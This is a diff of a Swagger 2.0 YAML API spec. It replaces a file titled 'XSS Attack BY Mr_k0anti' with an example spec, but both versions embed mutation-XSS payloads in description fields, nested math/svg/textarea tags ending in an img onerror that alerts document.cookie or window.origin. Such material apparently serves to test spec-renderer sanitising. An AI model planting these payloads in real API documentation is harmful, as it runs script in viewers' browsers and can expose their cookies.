@@ -1,38 +1,15 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Mr_k0anti
+  title: Example yaml.spec
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
 paths:
-  /M0X0101:
+  /accounts:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - Mr-k0anti
+        - accounts
       operationId: findAccounts
       summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-          format: int64
-          in: path
-          name: id
-          required: true
-          type: integer
-      responses:
-        '200':
-          description: No response was specified
